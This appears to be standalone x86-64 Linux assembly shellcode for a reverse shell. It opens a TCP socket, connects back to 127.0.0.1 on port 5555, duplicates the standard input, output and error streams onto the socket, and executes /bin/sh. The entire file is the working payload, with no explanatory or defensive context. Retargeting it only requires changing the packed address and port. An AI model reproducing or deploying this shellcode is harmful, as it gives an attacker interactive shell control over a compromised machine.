
global _start



_start:

push  0x29
pop    rax
xor rdx , rdx                  ;-->cltd
push  0x2
pop    rdi
push 0x1
pop    rsi
syscall
xchg   rdi,rax
mov rcx , 0x100007fb3150002
push   rcx
mov    rsi,rsp
push  0x10
 pop    rdx
push  0x2a
pop    rax
syscall
push  0x3
pop    rsi
 dup2_loop:
   dec    rsi
   push  0x21
   pop    rax
   syscall
 jne dup2_loop

 push  0x3b
 pop    rax
 xor rdx , rdx                ; -->cltd
mov rbx , 0x68732f6e69622f
push   rbx
mov    rdi,rsp
push   rdx
push   rdi
mov    rsi,rsp
syscall
